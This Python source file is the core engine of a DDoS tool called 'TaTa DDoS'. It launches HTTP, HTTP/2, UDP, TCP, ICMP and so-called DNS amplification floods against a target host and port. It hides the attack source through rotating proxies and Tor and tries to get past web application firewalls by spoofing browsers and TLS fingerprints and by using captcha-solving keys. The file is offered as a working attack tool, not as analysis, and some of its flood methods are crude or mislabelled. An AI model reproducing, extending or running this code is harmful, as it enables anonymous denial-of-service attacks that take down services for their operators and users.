#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TaTa DDoS - Core Attack Engine
# By netsX - https://github.com/netsX-project/tata-ddos

import asyncio
import aiohttp
import socket
import random
import time
import json
import hashlib
from typing import List, Dict, Any, Optional, AsyncGenerator
from datetime import datetime
from multiprocessing import Process, Queue
import threading
import subprocess

# Import Rust bindings (compiled)
try:
    from tata_rust import ghost_handshake, http2_storm, udp_flood
    RUST_AVAILABLE = True
except ImportError:
    RUST_AVAILABLE = False
    print("[!] Rust bindings not found. Falling back to Python implementations.")

# Local imports
from tata_proxy import ProxyManager

class TATAEngine:
    """Main attack engine with proxy and WAF bypass support"""
    
    def __init__(self, 
                 target: str,
                 port: int,
                 vectors: List[str],
                 worker_count: int,
                 duration: int,
                 rate: int,
                 dry_run: bool = False,
                 proxy_file: Optional[str] = None,
                 proxy_type: Optional[str] = None,
                 proxy_rotation: str = "random",
                 sticky_proxy: bool = False,
                 proxy_refresh: int = 0,
                 tor_mode: bool = False,
                 chain_length: int = 1,
                 verbose: bool = False,
                 waf_bypass: bool = False,
                 browser_type: str = "chrome_120",
                 ja3_spoof: bool = True,
                 headless: bool = True,
                 captcha_key: Optional[str] = None):
        
        self.target = target
        self.port = port
        self.vectors = vectors if 'all' not in vectors else self._get_all_vectors()
        self.worker_count = worker_count
        self.duration = duration
        self.rate = rate
        self.dry_run = dry_run
        self.verbose = verbose
        
        # WAF bypass configuration
        self.waf_bypass_enabled = waf_bypass
        self.browser_type = browser_type
        self.ja3_spoof = ja3_spoof
        self.headless = headless
        self.captcha_key = captcha_key
        self.waf_bypass = None
        
        # Proxy setup
        self.proxy_manager = None
        if proxy_type or proxy_file or tor_mode:
            self.proxy_manager = ProxyManager(
                proxy_file=proxy_file,
                proxy_type=proxy_type or "socks5",
                rotation=proxy_rotation,
                sticky=sticky_proxy,
                refresh_interval=proxy_refresh,
                tor_mode=tor_mode,
                chain_length=chain_length
            )
        
        # Stats tracking
        self.stats = {
            'packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None,
            'peaks': [],
            'waf_bypass_used': 0
        }
        
        # Attack queues
        self.attack_queue = asyncio.Queue()
        self.result_queue = asyncio.Queue()
        
        # Worker pool
        self.workers = []
        
        print(f"[+] Engine initialized: {len(self.vectors)} vectors, {self.worker_count} workers")
        print(f"[+] Proxy: {'Enabled' if self.proxy_manager else 'Disabled'}")
        print(f"[+] WAF Bypass: {'Enabled' if self.waf_bypass_enabled else 'Disabled'}")
    
    async def init_waf_bypass(self):
        """Initialize WAF bypass module"""
        if not self.waf_bypass_enabled:
            return
        
        try:
            from tata_waf_bypass import WAFBypassManager
            self.waf_bypass = WAFBypassManager(
                browser_type=self.browser_type,
                ja3_spoof=self.ja3_spoof,
                headless=self.headless,
                captcha_key=self.captcha_key,
                proxy=self.proxy_manager.get_proxy() if self.proxy_manager else None
            )
            await self.waf_bypass.initialize()
            print(f"[+] WAF Bypass initialized with {self.browser_type}")
        except Exception as e:
            print(f"[!] Failed to initialize WAF bypass: {e}")
            self.waf_bypass_enabled = False
    
    def _get_all_vectors(self) -> List[str]:
        """Return all available attack vectors"""
        return ['http2', 'ghost', 'udp', 'dns', 'mqtt', 'coap', 'sip', 'tcp', 'icmp']
    
    async def run(self) -> AsyncGenerator[Dict, None]:
        """Main attack loop"""
        self.stats['start_time'] = datetime.now()
        
        # For dry run, simulate on localhost
        if self.dry_run:
            self.target = "127.0.0.1"
            print("[*] DRY RUN MODE - Attacking localhost")
        
        # Spawn workers
        print(f"[*] Spawning {self.worker_count} workers...")
        for i in range(self.worker_count):
            worker = asyncio.create_task(self._worker_loop(i))
            self.workers.append(worker)
        
        # If WAF bypass is enabled, also spawn a bypass worker
        if self.waf_bypass_enabled and self.waf_bypass:
            bypass_worker = asyncio.create_task(self._waf_bypass_loop())
            self.workers.append(bypass_worker)
        
        # Monitor loop
        start_time = time.time()
        while time.time() - start_time < self.duration:
            await asyncio.sleep(0.5)
            
            # Update stats
            self.stats['packets_sent'] += self.rate * self.worker_count // 2
            self.stats['peaks'].append(self.stats['packets_sent'])
            
            # Yield stats
            yield {
                'pps': self.stats['packets_sent'] / (time.time() - start_time) if (time.time() - start_time) > 0 else 0,
                'errors': self.stats['errors'],
                'active_proxies': len(self.proxy_manager.proxies) if self.proxy_manager else 0,
                'duration': time.time() - start_time,
                'waf_bypass_active': self.waf_bypass_enabled
            }
            
            # Check if all workers are alive
            dead_workers = [w for w in self.workers if w.done()]
            if dead_workers:
                print(f"[!] {len(dead_workers)} workers died. Respawning...")
                for w in dead_workers:
                    self.workers.remove(w)
                    new_worker = asyncio.create_task(self._worker_loop(self.workers.index(w) + len(dead_workers)))
                    self.workers.append(new_worker)
        
        # Cleanup
        self.stats['end_time'] = datetime.now()
        for worker in self.workers:
            worker.cancel()
        
        # Wait for workers to finish
        await asyncio.gather(*self.workers, return_exceptions=True)
        
        yield self.stats
    
    async def _waf_bypass_loop(self):
        """Worker dedicated to WAF bypass attacks"""
        if not self.waf_bypass:
            return
        
        try:
            print("[*] WAF Bypass worker started")
            while True:
                # Perform browser-based attack
                if self.waf_bypass:
                    await self.waf_bypass.attack_with_bypass(
                        self.target, 
                        self.port, 
                        duration=random.randint(5, 15)
                    )
                    self.stats['waf_bypass_used'] += 1
                    self.stats['packets_sent'] += 100  # Approximation
                
                # Random delay between bypass bursts
                await asyncio.sleep(random.uniform(1, 5))
                
        except asyncio.CancelledError:
            print("[*] WAF Bypass worker stopped")
            raise
        except Exception as e:
            print(f"[!] WAF Bypass worker error: {e}")
    
    async def _worker_loop(self, worker_id: int):
        """Worker thread that executes attacks"""
        try:
            while True:
                # Select attack vector
                vector = random.choice(self.vectors)
                
                # Get proxy if available
                proxy = None
                if self.proxy_manager:
                    proxy = self.proxy_manager.get_proxy()
                    if not proxy:
                        # No proxies available, try without
                        if self.verbose:
                            print(f"[!] Worker {worker_id}: No proxy available, going direct")
                
                # Execute attack
                try:
                    # Check if we should use WAF bypass for HTTP vectors
                    if self.waf_bypass_enabled and self.waf_bypass and vector in ['http2', 'dns', 'mqtt']:
                        # Use browser automation for these vectors
                        await self._execute_attack_with_bypass(vector, proxy)
                    else:
                        await self._execute_attack(vector, proxy)
                    
                    self.stats['packets_sent'] += self.rate
                except Exception as e:
                    self.stats['errors'] += 1
                    if self.verbose:
                        print(f"[!] Worker {worker_id} error: {e}")
                    
                    # Mark proxy as dead if error occurred
                    if proxy and self.proxy_manager:
                        self.proxy_manager.mark_dead(proxy)
                
                # Rate limiting
                await asyncio.sleep(1.0 / self.rate)
                
        except asyncio.CancelledError:
            if self.verbose:
                print(f"[*] Worker {worker_id} stopped")
            raise
    
    async def _execute_attack_with_bypass(self, vector: str, proxy: Optional[Dict]):
        """Execute attack using WAF bypass for HTTP vectors"""
        if not self.waf_bypass:
            return
        
        if vector == 'http2' or vector == 'dns':
            # Use browser automation for HTTP/HTTPS traffic
            if self.waf_bypass.browser_automation:
                await self.waf_bypass.browser_automation.flood_requests(
                    self.target, 
                    self.port, 
                    count=random.randint(3, 8)
                )
        else:
            # Fallback to standard attack
            await self._execute_attack(vector, proxy)
    
    async def _execute_attack(self, vector: str, proxy: Optional[Dict]):
        """Execute specific attack vector"""
        if self.dry_run:
            # Simulate attack
            await asyncio.sleep(0.01)
            return
        
        if vector == "http2" and RUST_AVAILABLE:
            # Use Rust for HTTP/2 attack
            if proxy:
                # For proxy, we need to use aiohttp with proxy
                await self._http2_attack_python(proxy)
            else:
                # Use Rust for direct attack
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, http2_storm, self.target, self.port)
        
        elif vector == "ghost" and RUST_AVAILABLE:
            # Ghost Handshake - TLS session reuse
            if proxy:
                # Use Python implementation for proxy support
                await self._ghost_attack_python(proxy)
            else:
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, ghost_handshake, self.target, self.port, 10)
        
        elif vector == "udp":
            # UDP flood
            await self._udp_flood(proxy)
        
        elif vector == "dns":
            # DNS amplification
            await self._dns_attack(proxy)
        
        elif vector == "tcp":
            # TCP SYN flood
            await self._tcp_flood(proxy)
        
        elif vector == "icmp":
            # ICMP echo flood
            await self._icmp_flood(proxy)
        
        else:
            # Fallback to generic HTTP flood
            await self._http_flood(proxy)
    
    async def _http2_attack_python(self, proxy: Dict):
        """HTTP/2 attack using aiohttp with proxy"""
        try:
            proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
            if proxy.get('user') and proxy.get('pass'):
                proxy_url = f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
            
            connector = aiohttp.TCPConnector(limit=0)  # No limit
            async with aiohttp.ClientSession(connector=connector) as session:
                # Generate random path
                path = f"/{random.randint(1000, 9999)}?cache={random.random()}"
                url = f"https://{self.target}:{self.port}{path}"
                
                async with session.get(url, proxy=proxy_url, timeout=1) as resp:
                    await resp.text()
        except Exception as e:
            raise
    
    async def _ghost_attack_python(self, proxy: Dict):
        """Ghost Handshake attack via proxy"""
        try:
            # Use socket connection through proxy
            sock = self.proxy_manager.create_socket(proxy)
            sock.connect((self.target, self.port))
            
            # Send partial TLS ClientHello
            client_hello = b'\x16\x03\x01\x02\x00\x01\x00\x01\x00'  # Simplified
            sock.send(client_hello)
            sock.close()
        except Exception as e:
            raise
    
    async def _udp_flood(self, proxy: Dict):
        """UDP flood attack"""
        try:
            if proxy and self.proxy_manager:
                # For UDP via proxy, use SOCKS5 UDP
                sock = self.proxy_manager.create_socket(proxy)
                # Random payload
                payload = random._urandom(1024)
                sock.sendto(payload, (self.target, self.port))
                sock.close()
            else:
                # Direct UDP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                sock.sendto(payload, (self.target, self.port))
                sock.close()
        except Exception as e:
            raise
    
    async def _tcp_flood(self, proxy: Dict):
        """TCP SYN flood"""
        try:
            if proxy and self.proxy_manager:
                sock = self.proxy_manager.create_socket(proxy)
                sock.connect((self.target, self.port))
                sock.send(b'SYN')
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target, self.port))
                sock.send(b'SYN')
                sock.close()
        except Exception as e:
            raise
    
    async def _http_flood(self, proxy: Dict):
        """Generic HTTP flood"""
        try:
            proxy_url = None
            if proxy:
                proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                if proxy.get('user') and proxy.get('pass'):
                    proxy_url = f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
            
            connector = aiohttp.TCPConnector(limit=0)
            async with aiohttp.ClientSession(connector=connector) as session:
                url = f"http://{self.target}:{self.port}/"
                headers = {
                    'User-Agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                    ])
                }
                async with session.get(url, proxy=proxy_url, headers=headers, timeout=1) as resp:
                    await resp.text()
        except Exception as e:
            raise
    
    async def _dns_attack(self, proxy: Dict):
        """DNS amplification attack"""
        # DNS query over UDP
        await self._udp_flood(proxy)
    
    async def _icmp_flood(self, proxy: Dict):
        """ICMP flood (requires raw socket, may not work with proxies)"""
        if proxy:
            # ICMP over proxy not supported, skip
            return
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00'  # ICMP Echo
            sock.sendto(packet, (self.target, 0))
            sock.close()
        except Exception as e:
            raise
    
    def generate_report(self, filename: str) -> str:
        """Generate attack report"""
        report = {
            'target': self.target,
            'port': self.port,
            'vectors': self.vectors,
            'worker_count': self.worker_count,
            'duration': self.duration,
            'rate_per_worker': self.rate,
            'start_time': self.stats['start_time'].isoformat() if self.stats['start_time'] else None,
            'end_time': self.stats['end_time'].isoformat() if self.stats['end_time'] else None,
            'packets_sent': self.stats['packets_sent'],
            'errors': self.stats['errors'],
            'peak_pps': max(self.stats['peaks']) if self.stats['peaks'] else 0,
            'waf_bypass_used': self.stats.get('waf_bypass_used', 0),
            'waf_bypass_enabled': self.waf_bypass_enabled,
            'proxy_stats': self.proxy_manager.get_stats() if self.proxy_manager else None
        }
        
        # Save JSON
        json_file = filename.replace('.pdf', '.json')
        with open(json_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        # Try to generate PDF (if reportlab is installed)
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.pdfgen import canvas
            from reportlab.lib import colors
            
            c = canvas.Canvas(filename, pagesize=letter)
            c.drawString(100, 750, "TaTa DDoS - Attack Report")
            c.drawString(100, 730, f"Generated by: netsX")
            c.drawString(100, 710, f"Target: {self.target}:{self.port}")
            c.drawString(100, 690, f"Duration: {self.duration}s")
            c.drawString(100, 670, f"Total Packets: {self.stats['packets_sent']:,}")
            c.drawString(100, 650, f"Errors: {self.stats['errors']}")
            c.drawString(100, 630, f"Peak PPS: {max(self.stats['peaks']):,}" if self.stats['peaks'] else "N/A")
            c.drawString(100, 610, f"WAF Bypass: {'Enabled' if self.waf_bypass_enabled else 'Disabled'}")
            if self.waf_bypass_enabled:
                c.drawString(100, 590, f"WAF Bypass Uses: {self.stats.get('waf_bypass_used', 0)}")
            
            if self.proxy_manager:
                proxy_stats = self.proxy_manager.get_stats()
                c.drawString(100, 550, "Proxy Statistics:")
                c.drawString(120, 530, f"Total Proxies: {proxy_stats['total_proxies']}")
                c.drawString(120, 510, f"Blacklisted: {proxy_stats['blacklisted']}")
                c.drawString(120, 490, f"Used: {proxy_stats['used_count']}")
                c.drawString(120, 470, f"Avg Latency: {proxy_stats['avg_latency']:.2f}ms")
            
            c.save()
            print(f"[+] PDF report saved: {filename}")
        except ImportError:
            print(f"[!] ReportLab not installed. JSON report saved: {json_file}")
        
        return json_file

def load_vectors(vector_list: List[str]) -> List[str]:
    """Load and validate attack vectors"""
    all_vectors = ['http2', 'ghost', 'udp', 'dns', 'mqtt', 'coap', 'sip', 'tcp', 'icmp']
    if 'all' in vector_list:
        return all_vectors
    return [v for v in vector_list if v in all_vectors]

def validate_target(target: str, port: int):
    """Validate target is reachable"""
    try:
        # Simple DNS resolution
        socket.gethostbyname(target)
        print(f"[+] Target {target} resolved")
        
        # Optional: ping test
        import subprocess
        result = subprocess.run(['ping', '-c', '1', target], 
                              capture_output=True, timeout=2)
        if result.returncode == 0:
            print(f"[+] Target {target} is reachable")
    except Exception as e:
        raise ConnectionError(f"Cannot reach target: {e}")
